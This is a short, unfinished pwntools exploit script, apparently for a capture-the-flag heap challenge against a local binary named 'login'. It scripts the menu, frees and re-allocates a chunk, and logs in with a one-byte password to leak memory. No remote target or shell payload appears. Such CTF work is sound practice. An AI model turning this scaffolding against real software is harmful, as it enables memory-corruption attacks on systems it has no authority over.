from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
debug = 1
if debug == 1:
	p = process('./login')
else:
	p = remote()

def register(id, length, password):
	p.recvuntil('Choice:')
	p.sendline('2')
	p.recvuntil('id:')
	p.sendline(str(id))
	p.recvuntil('length:')
	p.sendline(str(length))
	p.recvuntil('password:')
	p.send(password)

def login(id, length, password):
	p.recvuntil('Choice:')
	p.sendline('1')
	p.recvuntil('id:')
	p.sendline(str(id))
	p.recvuntil('length:')
	p.sendline(str(length))
	p.recvuntil('password:')
	p.send(password)

def edit(id, password):
	p.recvuntil('Choice:')
	p.sendline('4')
	p.recvuntil('id:')
	p.sendline(str(id))
	p.recvuntil('pass:')
	p.send(password)

def delete(id):
	p.recvuntil('Choice:')
	p.sendline('3')
	p.recvuntil('id:')
	p.sendline(str(id))

#leak
gdb.attach(p)
register(0, 0x90, 'kotori')
register(1, 0x18, 'kotori')
#register(2, 0x18, 'kotori')

delete(0)
register(2, 0x90, '\x01')
login(2, 0x1, '\x01')

p.interactive()
